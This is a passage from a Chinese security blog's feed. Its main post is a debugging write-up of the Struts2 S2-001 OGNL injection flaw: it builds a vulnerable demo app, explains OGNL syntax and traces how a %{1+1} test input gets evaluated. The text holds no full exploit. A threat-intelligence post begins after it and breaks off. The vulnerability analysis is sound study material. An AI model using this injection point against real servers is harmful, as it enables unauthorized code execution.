    <content type="html"><![CDATA[<blockquote><p>@ Author: Patrilic<br>@ Time: 2019-8-15 02:11:50<br><img src="/wallpaper/[33861]❊-52241977.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>太菜了，马上进入大三了，最近java的中间件也陆陆续续的爆了很多洞，然后之前也经常接触类似于Weblogic反序列化、struts2命令执行之类的漏洞。借着重刷了一遍Fate Stay Night 06版，睡不着觉，干脆就来开始人生中第一个S2漏洞分析</p><h2 id="0x01-漏洞链接"><a href="#0x01-漏洞链接" class="headerlink" title="0x01 漏洞链接"></a>0x01 漏洞链接</h2><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a><br>影响版本：</p><blockquote><p>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p></blockquote><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>struts2包下载地址：<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.8-all.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.8-all.zip</a></p><p>搭建平台： MacOS Mojave 10.14.5<br>使用工具： IntelliJ IDEA<br>Tomcat版本：Apache Tomcat 8.5.16 - MxSrvs自带</p><p>首先New一个Project<br><img src="/S2-001 调试日记.resources/6FA2BAFC-BE8C-4740-B028-5642E9A3EAA8.png" alt="ddca0c177f31ccb51326857cc63de34e"></p><p>将需要的jar包放入/WEB-INF/lib目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">commons-logging-1.0.4.jar</span><br><span class="line">freemarker-2.3.8.jar</span><br><span class="line">ognl-2.6.11.jar</span><br><span class="line">struts2-core-2.0.8.jar</span><br><span class="line">xwork-2.0.3.jar</span><br></pre></td></tr></table></figure></p><p><img src="/S2-001 调试日记.resources/C8DBD68B-81B6-4C2D-BBCD-6F87BEEF1CB8.png" alt="19046de56e4a9f83e5eeee434f3ef471"></p><p>创建index.jsp文件<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>创建welcome.jsp文件<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>在src目录下创建Package <code>com.demo.action</code><br>然后创建class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>导入包<br>File-&gt;Project Structure<br><img src="/S2-001 调试日记.resources/AE8F8103-1317-4E1B-9954-D16381A8BEA7.png" alt="c2721572cd14b75b50bd62cccab3e8dd"><br><img src="/S2-001 调试日记.resources/B172D40B-5AF0-4C93-A59F-C2653B0024D9.png" alt="21aff5f519ea4ea23e7ee17e32e7dfaa"></p><p>然后设置好tomcat配置就可以Run了<br><img src="/S2-001 调试日记.resources/0D2C780D-825D-43A0-A5F6-D66B0862F51B.png" alt="c9de8ac5327705aa2b9825e2f5e0786a"></p><p><img src="/S2-001 调试日记.resources/37A62E68-1AF0-4309-87FC-DE26FBFC1A36.png" alt="e5e2c3d3929818faaf2e41f45264a79d"></p><p>如果遇到<code>java.lang.IllegalStateException: struts.properties missing</code>的问题<br>检查一下自己创建的包名或者类名是否与<code>struts.xml</code>中配置的一致</p><p>漏洞环境就已经搭好了</p><h2 id="0x03-OGNL表达式"><a href="#0x03-OGNL表达式" class="headerlink" title="0x03 OGNL表达式"></a>0x03 OGNL表达式</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><blockquote><p>OGNL是Object-Graph Navigation Language的缩写，它是一种功能强大的表达式语言（Expression Language，简称为EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。　　　　　　　　　　　　　　　　——-百度百科</p></blockquote><p>OGNL的三要素：</p><p>　　一、表达式：</p><p>　　　　表达式（Expression）是整个OGNL的核心内容，所有的OGNL操作都是针对表达式解析后进行的。通过表达式来告诉OGNL操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL表达式支持大量的表达式，如“链式访问对象”、表达式计算、甚至还支持Lambda表达式。</p><p>　　二、Root对象：</p><p>　　　　OGNL的Root对象可以理解为OGNL的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是Root对象，这就意味着，如果有一个OGNL表达式，那么我们需要针对Root对象来进行OGNL表达式的计算并且返回结果。</p><p>　　三、上下文环境：</p><p>　　　　有个Root对象和表达式，我们就可以使用OGNL进行简单的操作了，如对Root对象的赋值与取值操作。但是，实际上在OGNL的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL的上下文环境是一个Map结构，称之为OgnlContext。Root对象也会被添加到上下文环境当中去。</p><h3 id="Ognl表达式语言的作用"><a href="#Ognl表达式语言的作用" class="headerlink" title="Ognl表达式语言的作用"></a>Ognl表达式语言的作用</h3><p>jsp页面取值用<br>EL表达式语言，也用于页面取值，是jsp页面取值的标准（默认就可以使用）<br>Ognl表达式语言，Struts标签默认支持的表达式语言，必须配置Struts标签用，不能离开Struts标签直接使用，就是说Ognl必须在Struts中使用<br>对比来看，EL使用范围更广，项目中不限制使用哪一种，哪一种熟悉就使用哪一种</p><h3 id="OGNL-的基本语法"><a href="#OGNL-的基本语法" class="headerlink" title="OGNL 的基本语法"></a>OGNL 的基本语法</h3><ol><li><p>对Root对象的访问<br>OGNL使用的是一种链式的风格进行对象的访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User(<span class="string">"rcx"</span>, <span class="string">"123"</span>);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"name"</span>, user));</span><br></pre></td></tr></table></figure></li><li><p>对上下文对象的访问<br>使用OGNL的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。当访问上下文环境当中的参数时候，需要在表达式前面加上’#’，表示了与访问Root对象的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User(<span class="string">"rcx"</span>, <span class="string">"123"</span>);</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">context.put(<span class="string">"user"</span>, user);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"#user.name"</span>, context, user));</span><br></pre></td></tr></table></figure></li><li><p>对静态变量的访问<br>在OGNL表达式当中也可以访问静态变量或者调用静态方法，格式如@[class]@[field/method()]。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object object = Ognl.getValue(<span class="string">"@com.rcx.ognl.Constant@ONE"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(object);</span><br></pre></td></tr></table></figure></li><li><p>方法的调用<br>如果需要调用Root对象或者上下文对象当中的方法也可以使用.+方法的方式来调用。甚至可以传入参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User();</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">context.put(<span class="string">"name"</span>, <span class="string">"rcx"</span>);</span><br><span class="line">context.put(<span class="string">"password"</span>, <span class="string">"password"</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"getName()"</span>, context, user));</span><br><span class="line">Ognl.getValue(<span class="string">"setName(#name)"</span>, context, user);</span><br><span class="line">System.out.println(Ognl.getValue(<span class="string">"getName()"</span>, context, user));</span><br></pre></td></tr></table></figure></li><li><p>对数组和集合的访问<br>OGNL支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于Map支持使用键进行访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User();</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">String[] strings  = &#123;<span class="string">"aa"</span>, <span class="string">"bb"</span>&#125;;</span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">list.add(<span class="string">"aa"</span>);</span><br><span class="line">list.add(<span class="string">"bb"</span>);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">map.put(<span class="string">"key1"</span>, <span class="string">"value1"</span>);</span><br><span class="line">map.put(<span class="string">"key2"</span>, <span class="string">"value2"</span>);</span><br><span class="line">context.put(<span class="string">"list"</span>, list);</span><br><span class="line">context.put(<span class="string">"strings"</span>, strings);</span><br><span class="line">context.put(<span class="string">"map"</span>, map);</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#strings[0]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#list[0]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#list[0 + 1]"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#map['key1']"</span>, context, user));</span><br><span class="line">    System.out.println(Ognl.getValue(<span class="string">"#map['key' + '2']"</span>, context, user));</span><br><span class="line">    &#125; ...</span><br></pre></td></tr></table></figure></li><li><p>投影与选择<br>OGNL支持类似数据库当中的选择与投影功能。<br>投影：选出集合当中的相同属性组合成一个新的集合。语法为collection.{XXX}，XXX就是集合中每个元素的公共属性。</p></li></ol><p>　　选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为collection.{Y XXX}，其中Y是一个选择操作符，XXX是选择用的逻辑表达式。</p><p>　　　　选择操作符有3种：</p><p>　　　　　　? ：选择满足条件的所有元素</p><p>　　　　　　^：选择满足条件的第一个元素</p><p>　　　　　　$：选择满足条件的最后一个元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Person p1 = <span class="keyword">new</span> Person(<span class="number">1</span>, <span class="string">"name1"</span>);</span><br><span class="line">Map&lt;String, Object&gt; context = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">ArrayList&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</span><br><span class="line">list.add(p1);</span><br><span class="line">context.put(<span class="string">"list"</span>, list);</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; list2 = (ArrayList&lt;Integer&gt;) Ognl.getValue(<span class="string">"#list.&#123;id&#125;"</span>,context,list);</span><br><span class="line">System.out.println(list2);</span><br></pre></td></tr></table></figure><ol start="7"><li>创建对象<br>OGNL支持直接使用表达式来创建对象。主要有三种情况：<br>构造List对象：使用{},中间使用’,’进行分割如{“aa”, “bb”, “cc”}<br>构造Map对象：使用#{}，中间使用’,进行分割键值对，键值对使用’:’区分，如#{“key1” : “value1”, “key2” : “value2”}<br>构造任意对象：直接使用已知的对象的构造方法进行构造。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; map = (Map&lt;String, String&gt;)Ognl.getValue(<span class="string">"#&#123;'key1':'value1'&#125;"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(map);</span><br><span class="line">List&lt;String&gt; list = (List&lt;String&gt;)Ognl.getValue(<span class="string">"&#123;'key1','value1'&#125;"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(list);</span><br><span class="line">Object object = Ognl.getValue(<span class="string">"new java.lang.Object()"</span>, <span class="keyword">null</span>);</span><br><span class="line">System.out.println(object);</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞验证"><a href="#0x04-漏洞验证" class="headerlink" title="0x04 漏洞验证"></a>0x04 漏洞验证</h2><p><img src="/S2-001 调试日记.resources/AE253F90-888E-41D1-90B8-15C4B43015B0.png" alt="173a3723c16631be26264844cdbf62f1"></p><p><img src="/S2-001 调试日记.resources/5EEDC8F3-78F4-480C-8DEF-66D5F3A94521.png" alt="d984073fd34482b1ab9fdcbde28db701"></p><h2 id="0x05-漏洞分析"><a href="#0x05-漏洞分析" class="headerlink" title="0x05 漏洞分析"></a>0x05 漏洞分析</h2><p><img src="/S2-001 调试日记.resources/6C8B9E07-AF85-49FC-B9C5-C1D818490AB0.jpg" alt="7b8b8f885d3938a55ac1f182230f389b.jpeg"></p><p>Tomcat容器处理后，将http请求发送至struts2，然后分两个阶段：</p><ul><li>第一阶段： St2对请求进行预处理,这个阶段主要是St2和web容器打交道,把http请求封装成java对象.为真正的业务逻辑执行做必要的数据环境和运行环境的准备</li><li>第二阶段：XWork,执行具体的业务逻辑.</li></ul><p>首先来了解一下拦截器</p><blockquote><p>java里的拦截器是动态拦截Action调用的对象，它提供了一种机制可以使开发者在一个Action执行的前后执行一段代码，也可以在一个Action执行前阻止其执行，同时也提供了一种可以提取Action中可重用部分代码的方式。在AOP中，拦截器用于在某个方法或者字段被访问之前，进行拦截然后再之前或者之后加入某些操作。目前，我们需要掌握的主要是Spring的拦截器，Struts2的拦截器不用深究，知道即可。</p></blockquote><p><img src="/S2-001 调试日记.resources/87075291-4555-41BC-88CF-2F4F726BA71E.png" alt="48f11e0431d2c25296631c524ecb17dc"><br>在struts.xml里下一个拦截器，然后在struts_defalut.xml里能找到它拦截的class<br><img src="/S2-001 调试日记.resources/8AD9EB5A-5743-4E42-84F8-724D6D50F987.png" alt="6244e2c9092e27087d80960fd067f86c"></p><p><img src="/S2-001 调试日记.resources/1B116D26-D461-4173-B2AA-A4639BF3C65A.png" alt="11ae2cbbc91813e4be305fcd62fcd2f7"><br>第87行、把传入的参数打入到值栈中,我们在这里下断点<br><img src="/S2-001 调试日记.resources/0B9C052A-FBA3-402E-B441-377BC06BEC9E.png" alt="210a7716d4e72acc34ea0c9e4debb639"><br>继续往下，97行，带入到invocation.invoke()</p><p><img src="/S2-001 调试日记.resources/0F272921-D58B-457B-B0FE-03FE1E447BF7.png" alt="c95f5460a33e0a3cce226cb863a704fe"><br>继续跟<br><img src="/S2-001 调试日记.resources/C12A6394-C3E3-4591-8B72-DFEC418B2836.png" alt="40d89332841b0919edbc30728ba0dff4"><br>步入<code>executeResult()</code></p><p>然后步入<code>dispatcher.forward()</code></p><p><img src="/S2-001 调试日记.resources/D0D7AEDE-9400-4D4F-B636-DCF8B2E2FE9D.png" alt="4d1c0453520932caa0527b00105e2931"><br>调试到这里又到了index.jsp<br>然后就是在<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>解析标签<br><img src="/S2-001 调试日记.resources/489250AB-D028-46B8-93EE-E7652452F06B.png" alt="83ab3028a4d3ce9e570b2dd77b6c06d4"><br>然后步入<code>evaluateParams()</code><br><img src="/S2-001 调试日记.resources/B66173B9-1004-4877-B90C-52ED6488D814.png" alt="148f0c15f9f6c13af04ed5bcf3357e66"><br>继续执行到altSyntax(),这个方法返回true,根据<a href="https://cwiki.apache.org/confluence/display/WW/Alt+Syntax" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/Alt+Syntax</a><br>,altSyntax默认开启,为了动态的改变标签属性的值,它允许执行标签属性中的OGNL表达式.</p><p>同时,为了不过多的引入单引号,可以使用”%{…}”的形式来写入表达式.</p><p>此后o为%{1+1}，再对o进行了一番处理后，payload经过result变量，最终成为expression的值：<br><img src="/S2-001 调试日记.resources/38069271-2D08-4E46-AF70-5D74F1CA6BF2.png" alt="f079a36c37e194f8835ce649747acfae"></p><p><img src="/S2-001 调试日记.resources/1EF4E0C0-D0AD-47E9-B2D6-28F1583690EB.png" alt="2e1134a2480a0576252c8bffc59beea3"><br><img src="/S2-001 调试日记.resources/96B54A5E-7312-40B9-A2D6-0DEF9D868B6E.png" alt="29bb80f0510fa9b3c240536a175a3c7b"><br>最后<code>Object o = stack.findValue(var, asType);</code>执行payload<br><img src="/S2-001 调试日记.resources/F61303FA-6893-40A5-A62B-492EC506AE7C.png" alt="69e61401ac66f42f5b7f17f42870d541"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>其实这个漏洞还是挺简单的，写的很乱，但是确实是跟着几篇文章一步一步自己跳出来的，也算是第一个调的java漏洞了，学到很多调试技巧，膜一下chybeta师傅..</p><h2 id="0x07-链接"><a href="#0x07-链接" class="headerlink" title="0x07 链接"></a>0x07 链接</h2><p><a href="https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://03i0.com/2018/04/08/S2-001%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8</a></p><p><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@ Author: Patrilic&lt;br&gt;@ Time: 2019-8-15 02:11:50&lt;br&gt;&lt;img src=&quot;/wallpaper/[33861]❊-52241977.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="Struts2" scheme="http://patrilic.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>初识威胁情报</title>
    <link href="http://patrilic.top/2019/08/14/%E5%88%9D%E8%AF%86%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <id>http://patrilic.top/2019/08/14/初识威胁情报/</id>
    <published>2019-08-14T15:32:22.000Z</published>
    <updated>2019-08-16T05:11:03.428Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-14 23:32:22<br><img src="/wallpaper/[30679]SCENT-65089776.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>自从把学习重心偏向RedTeam相关之后，一直想学习关于威胁情报的东西，平时也会在<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步社区</a>之类的地方去看一些关于威胁的分析报告。今天晚上终于空了下来，准备好好的沉淀一下，最近发生很多事情，并且接了个项目，一直在忙，这几天就好好的沉静下来去系统认识一下这个东西</p><h2 id="0x01-相关概念"><a href="#0x01-相关概念" class="headerlink" title="0x01 相关概念"></a>0x01 相关概念</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>翻了很多文章，大多数都是认为威胁情报的定义为Gartner在2014年发表的《安全威胁情报服务市场指南》</p><blockquote><p>基于一定知识的证据，已经存在或正在形成的潜在威胁，比如，上下文、机制、指标、意义以及可实施的建议，利用这些，可以帮助当事人形成应对这些危险的决策。</p></blockquote><h3 id="the-pyramid-of-pain"><a href="#the-pyramid-of-pain" class="headerlink" title="the-pyramid-of-pain"></a>the-pyramid-of-pain</h3><p><img src="/初识威胁情报.resources/7EC24897-0F01-4B0B-A3D3-63D3E1AF2863.png" alt="8be5978252a523fd61cee3ef211d70d2"><br><strong>这个金字塔非常明显的展示了关于情报和利用的困难度对应的关系，同时也和情报的价值相关</strong></p><p>从下往上看：<br><strong>Hash Value</strong>：Hash值是一个文件的唯一凭证，类似于我们在<code>VirusTotal</code>中提交样本那串hash，但是如果文件中有一点东西被改变了，都会导致这个文件的Hash值变得不同，所以反而，一个样本的hash也是最不值得跟踪的，当然价值也最低。</p><p><strong>Ip Addresses</strong>：IP地址，如果攻击者常用的<code>Pentest Server</code>被记录下来的话，也有一定的价值，不过目前来说，绝大部分人使用C2域名来隐藏自己的攻击，同时使用CDN/代理之类的手段的来不停的变换自己的IP，来绕过跟踪。</p><p><strong>Domain Names</strong>：域名的话是现在大多数隐蔽攻击的方式，注册一个类似域名，配合使用鱼叉攻击的工具可以达到邮件钓鱼之类的目的。域名的话需要注册，备案，然后与服务器进行绑定，所以准备的东西还是比较多的。但是这种方式隐蔽攻击的效果也较好，特别是如果存在<code>Subdomain Takeover</code>这样的漏洞，效果非常的棒。但是在大型APT行动中，攻击者也会准备大量域名，所以这个的价值就显得不是特别的高了。</p><p><a href="https://www.secpulse.com/archives/94973.html" target="_blank" rel="noopener">深入解析子域名接管（Subdomain Takeover）漏洞</a></p><p><strong>Network/Host Artifacts</strong>：顾名思义，这一层是网络与主机特征，这里特征并不单单包括攻击者的各种主机信息，例如访问的特定UA头等，还包括了攻击者所获得的账号密码，例如从某一个VPN账号连接至内网，然后又从某一台出口机器走出的流量等。</p><p><strong>Tools</strong>：特定组织/单独的黑客通常会使用相同或相似的方法进行攻击，获得了使用的工具特征，就能进行针对性的免杀等，让攻击者增加成本<br><strong>TTPs</strong>：<code>Tactics、Techniques &amp; Procedures</code>，TTPs在攻击方也是最重要的，指所使用的攻击策略、手法等，了解了一个组织的TTPs，就能明白攻击者所利用的具体漏洞，然后去防御。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>这里推一波<code>@e1knot</code>师傅在Defcon Group上的演讲PPT</p><p>👉 <a 